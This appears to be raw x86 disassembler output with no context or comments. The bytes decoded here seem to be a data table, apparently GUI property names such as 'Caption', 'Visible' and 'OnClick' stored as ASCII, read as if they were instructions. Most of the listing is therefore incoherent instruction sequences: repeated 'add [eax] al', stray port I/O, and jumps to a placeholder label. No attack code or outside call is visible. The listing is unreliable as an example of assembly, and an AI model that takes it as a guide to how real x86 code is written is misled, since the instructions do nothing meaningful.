add [ eax ] al
sub [ eax ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add bh bh
inc esp
imul ecx [ ecx ] 0x1
push ebx
add [ eax ] cl
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
add [ eax ] al
pop ds
add [ esi ] cl
push eax
popad
jb r-xdata
add [ eax ] eax
and [ eax ] al
or edx [ eax + 0x61 ]
jb r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
add [ edi ] al
push esi
inc esp
add [ edi ] dl
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080026 ] al
add [ eax + 0x50090025 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
sub_4540f6
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ ebp + ebp * 4 + 0x45 ] bl
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ esp + esi * 4 + 0x755c0045 ] bl
dec ecx
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ esi + esi * 4 + 0x25940045 ] ch
dec ecx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esp + esi * 4 ] cl
inc ebp
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah cl
mov ah 0x45
add [ eax ] cl
mov ch 0x45
add ah al
stosb [ edi ]
inc ebp
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add ah ch
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd4458a57
jle r-xdata
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
nop
cwde
ja r-xdata
insb
jae r-xdata
add ah bl
stosd [ edi ]
inc ebp
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ eax ] al
insb
dec edi
jne r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x65420900
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
push 0x6100487b
add [ eax ] al
add al dl
jno r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ esp + 0x45 ] ch
add [ esp - 0x58a7ffbb ] cl
inc ebp
add [ edi ] dl
inc ebp
add al al
test al 0x45
add [ eax + 0x380045a7 ] cl
cmpsd [ esi ] [ edi ]
inc ebp
add ah ch
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax ] ah
test al 0x45
add [ esi + esi * 4 ] dl
inc ebp
add [ eax - 0x4a ] dh
inc ebp
add [ 0x6d654d54 ] al
outsd
nop
nop
and al 0x42
inc ebp
add [ edi ] al
add eax 0x6d654d54
outsd
adc [ ecx + 0x45 ] al
add [ eax + 0x4d004540 ] dl
add [ eax ] cl
push ebx
je r-xdata
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
jb r-xdata
popad
jae r-xdata
add bh bh
and cl ah
dec eax
add [ ecx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ 0x1aff0000 ] 0x0
jb r-xdata
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
test al 0x1
add bh bh
push esp
ja r-xdata
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] al
push ss
insb
inc ebp
jae r-xdata
[ edi + ecx * 8 - 0x2f37ffb8 ]
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x67696c41
outsb
fcom [ edx ]
inc edx
add [ eax + 0x2 ] ah
add bh bh
fsub [ ebp + eax * 2 + 0x100 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x6c ] eax
hlt
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
inc esp
sbb [ esi + 0x44 ] dl
int3
outsb
jae r-xdata
jl r-xdata
and al 0xa5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc eax [ edx ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] dl
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + eax ] dl
or al [ edx + 0x65 ]
jbe r-xdata
jb r-xdata
add [ edx + eax ] dl
xor eax [ eax + ebx + 0x56 ]
inc esp
add [ eax ] al
add [ eax ] al
insb
inc edx
jne r-xdata
les edi [ edx + 0x48 ]
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
outsd
sbb [ eax ] eax
or [ ebx + 0x68 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
je r-xdata
add [ eax + 0x42080017 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
inc edx
inc edi
add [ eax + 0x2 ] ch
add bh bh
add [ ebp + 0x10045 ] ah
insb
dec ecx
outsb
outsb
jb r-xdata
and [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax ] cl
inc esp
jb r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
insb
loopne r-xdata
add [ eax ] al
add [ edx ] dl
add [ 0x65646948 ] cl
push esi
inc esp
add [ edi + 0x2 ] ch
add bh bh
je r-xdata
dec eax
imul esp [ ebp + 0x53 ] 0x63656c65
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax - 0xfffffb ] al
sbb al [ eax ]
inc ebp
add [ ecx + 0x2 ] dh
add bh bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ edx ] bl
add bh bh
je r-xdata
outsb
je r-xdata
and [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
add [ eax ] 0x0
add [ eax ] al
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or eax 0x65646948
add [ edx + eax ] ah
dec [ eax + 0x10045a5 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ ecx ] cl
dec ebp
popad
js r-xdata
outsb
dec eax
lea ecx [ eax ]
les eax [ ecx ]
add bh bh
les eax [ ecx ]
add bh bh
outsd
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
sbb [ esi + 0x44 ] dl
add [ eax + 0x2 ] dh
add bh bh
mov eax 0x10045a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ds
add [ edx ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
adc al 0x50
outsb
je r-xdata
loopne r-xdata
outsb
je r-xdata
add [ eax ] eax
jb r-xdata
add [ eax ] eax
add [ eax ] al
and [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
les edi [ ecx + 0x640046 ]
inc ebx
jne r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ ebx ] ch
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
jb r-xdata
add [ eax + edx * 2 ] dl
outsd
insb
outsd
jb r-xdata
dec eax
outsb
je r-xdata
inc esp
sbb [ esi + 0x44 ] dl
add [ eax ] al
sub [ eax ] eax
push cs
push eax
popad
jb r-xdata
sbb [ esi + 0x44 ] dl
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and al 0x0
pop es
dec ecx
insd
dec ebp
outsd
fmul [ gs : ebp + 0x1c80048 ]
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6d490700
dec esi
popad
insd
cmp al 0x22
inc edx
add [ eax - 0x3b00fffe ] dl
mov dh 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050026 ] al
imul ebp [ esi + 0x65 ] 0x44566c73
outsd
outsb
je r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040022 ] al
jmp [ eax + 0x48 ]
jae r-xdata
push 0x49
add [ ebx + ebp * 2 ] ch
jo r-xdata
add [ cs : esi ] cl
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ eax ] al
xor [ eax ] al
or [ edx + 0x65 ] dl
popad
outsb
je r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] al
sub eax [ eax ]
or edx [ eax + 0x61 ]
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
sub eax 0x61500a00
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
add bh bh
loopne r-xdata
jb r-xdata
inc esp
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
outsd
inc esp
fisttp [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ecx ] cl
push eax
add [ eax ] al
xor [ eax ] eax
or dl [ ebx + 0x63 ]
jb r-xdata
inc ebp
add [ edx + eax - 0x492b0100 ] dl
inc ebp
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push esi
inc esp
add [ edi ] dl
insb
insb
inc edx
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al [ eax ]
call esp
mov dh 0x45
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add [ eax ] 0x0
add [ eax + 0x440e001d ] al
outsd
jne r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080032 ] al
dec edi
outsb
add [ eax ] cl
push edx
popad
push esi
inc esp
add [ edx + eax ] ch
add [ eax ] 0x0
jb r-xdata
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add bh bh
js r-xdata
je r-xdata
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
xor al 0x0
pop es
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
sbb [ esi + 0x44 ] dl
insb
jns r-xdata
pop ds
inc esi
add [ eax + eax ] bh
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
push esi
imul esi [ ebx + 0x69 ] 0x18656c62
push esi
inc esp
add [ esi - 0x6900fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x61570b00
outsb
je r-xdata
add [ edi ] al
push 0x6948776f
outsb
je r-xdata
jpe r-xdata
add [ eax + 0x5009002f ] al
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
add bh bh
fsub [ esi + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
add bh bh
add [ eax ] eax
jb r-xdata
add bh bh
mov al 0xde
dec eax
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
cmp [ eax ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070039 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
jae r-xdata
add [ eax ] al
add [ eax + 0x4f0a003d ] al
outsb
js r-xdata
add [ eax ] cl
push edi
popad
outsb
je r-xdata
push esi
inc esp
add [ edi - 0x6800fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ss : eax ] cl
add [ eax ] al
dec edi
jbe r-xdata
mov [ edx + 0xf80048 ] al
add bh bh
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
popad
bound esi [ ebx + 0x18 ]
push esi
inc esp
add [ ebp - 0x1700fffe ] dl
mov dh 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax ] al
jo r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push edi
jb r-xdata
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
js r-xdata
or [ eax ] 0xf8
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
push cs
adc al 0x42
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
jo r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ esi ] 0xb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
popad
je r-xdata
sbb al 0x81
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
inc esp
jb r-xdata
add [ eax ] al
aaa
add [ eax ] cl
push edi
outsd
jb r-xdata
add [ eax ] eax
adc al 0x42
add [ eax + 0x2 ] bh
or [ eax + eax + 0xb ] 0x4f
dec ebp
adc al 0x42
add [ eax ] bh
add [ eax ] eax
rol [ eax + 0x2200048 ] 0x1
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ edi ] al
dec edi
or [ eax ] 0x10
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090042 ] al
outsb
jae r-xdata
inc ebp
outsb
je r-xdata
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
dec eax
add [ edi + ecx * 2 ] cl
adc al 0x42
add al bh
add [ eax ] eax
jo r-xdata
je r-xdata
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004a ] al
pop es
inc ebx
outsd
outsb
je r-xdata
push ebp
outsb
dec ebp
outsd
jne r-xdata
or [ edx ] 0x9
dec edi
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
outsd
arpl [ ebx + 0x40 ] bp
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004c ] al
dec esp
popad
jbe r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
dec edi
or [ eax ] 0xff0000e0
loopne r-xdata
insb
push esi
inc esp
add [ eax - 0x6c ] bh
test [ ebx + 0x45 ] cl
inc esp
inc ebx
outsd
outsb
je r-xdata
jo r-xdata
push ebp
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
jb r-xdata
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004b ] al
inc edi
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
outsb
adc al 0x42
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0048 ] al
outsb
push ebx
je r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x4ee40045 ] dl
inc edx
add [ esp + 0x64ec0042 ] cl
inc edx
add ah bh
inc edx
add ah ch
inc edx
add [ eax - 0x49 ] ah
inc ebp
add [ esi ] dl
push esp
inc ebx
jne r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] dh
and [ edx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
jb r-xdata
dec eax
add [ esi + edx * 2 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] bh
adc al 0x4b
inc ebp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
pop edx
inc edx
add [ ecx + ebx * 2 - 0x476bffbe ] bh
inc ebp
add [ ebp + ebx * 2 + 0x42 ] bh
add al al
mov bh 0x45
add ah bl
mov bh 0x45
add ah bl
pop ebp
inc edx
add [ eax + 0x70004263 ] bl
mov eax 0x65b40045
inc edx
add [ esi ] bh
inc edx
add [ eax - 0x27ffba47 ] ah
push 0x58bc0042
inc edx
add al ah
pop eax
inc edx
add [ ecx + ebx * 2 ] al
inc edx
add al dh
mov eax 0xb9600045
inc ebp
add [ eax - 0x77ffbda4 ] dl
pop ebp
inc edx
add [ eax + 0x45b9 ] al
pushad
inc edx
add ah dl
pushad
inc edx
add [ eax + 0x8004479 ] dl
popad
inc edx
add [ eax ] bh
popad
inc edx
add [ ecx + 0x61e80042 ] cl
inc edx
add ah dh
popad
inc edx
add al ch
bound eax [ edx ]
jl r-xdata
dec esp
test [ eax + eax + 0x44 ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
je r-xdata
jb r-xdata
popad
outsd
jbe r-xdata
dec ebp
add [ eax + eax + 0x74 ] 0x82
inc esp
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
dec esp
inc ebp
add [ eax + eax ] ah
dec ecx
je r-xdata
rol [ ecx ] cl
nop
nop
ja r-xdata
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x98004481
mov bh 0x45
add [ eax - 0x17ffbdb2 ] dl
push 0x6c004484
insb
add [ 0x65646e49 ] al
js r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
inc esp
outsd
jb r-xdata
popad
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
xor [ ecx ] ah
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
inc ebp
add ah cl
add al [ eax ]
add [ eax + 0x6c00489e ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
dec esi
inc ebp
add ah ah
dec esi
je r-xdata
add [ eax ] al
enter 0x454c 0x0
and al 0x0
outsb
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
add [ eax - 0x6fffba49 ] bl
dec esi
inc edx
add al ch
jb r-xdata
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
jb r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
outsb
je r-xdata
jmp 0xffffffff84a94d94
imul ebp [ esi + 0x67 ] 0x4ce49073
inc ebp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
js r-xdata
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xcc004481
je r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
outsd
jb r-xdata
add al 0x8
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add [ eax + 0x454c3490 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
dec esp
inc ebp
add [ eax ] al
add [ eax ] al
dec eax
add [ esi + edx * 2 + 0x44 ] ch
push esp
mov esp 0x2bec0045
dec ecx
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add al bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x3d ] dl
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al al
dec ecx
add al al
sub [ ecx ] ecx
sbb al cl
inc ebp
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + edi * 4 + 0x45 ] dl
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
test [ eax + eax - 0x4 ] al
je r-xdata
je r-xdata
add [ esi + edi + 0x7d080049 ] al
add [ eax + ebp * 2 + 0x49 ] bh
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ edi + eax * 8 + 0x45 ] ah
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
inc ebp
add [ ebp + esi * 2 + 0x49 ] bl
imul ebp [ esi + 0x67 ] 0x454c3473
add [ edx ] bh
inc edx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov ebp 0xbd2c0045
inc ebp
add [ eax + 0x280045ca ] bl
mov esp 0xc96c0045
inc ebp
add [ eax - 0x37 ] bh
inc ebp
